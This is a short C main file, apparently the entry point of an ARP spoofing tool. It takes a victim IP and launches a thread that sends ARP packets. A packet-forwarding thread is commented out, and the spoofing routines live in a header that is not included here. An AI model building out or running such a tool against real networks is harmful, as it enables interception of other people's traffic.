#include "header.h"

int main(int argc, char **argv)
{
        int thr_id;
        int status;
        addr_t table;

        set_addr(&table, argv[1]);

        if (argc != 2) {
                printf("Usage: %s <victim ip>\n", argv[0]);
                exit(1);
            }



        pthread_t p_thread1;  // send_arp
        //pthread_t p_thread2;  // deliver_packet

        thr_id = pthread_create(&p_thread1, NULL, thread1_send_arp, (void *)&table);
        //thr_id = pthread_create(&p_thread2, NULL, thread2_deliver_packet, (void *)&table);

        pthread_join(p_thread1, (void **) &status);
        //pthread_join(p_thread2, (void **) &status);

        return 0;
}
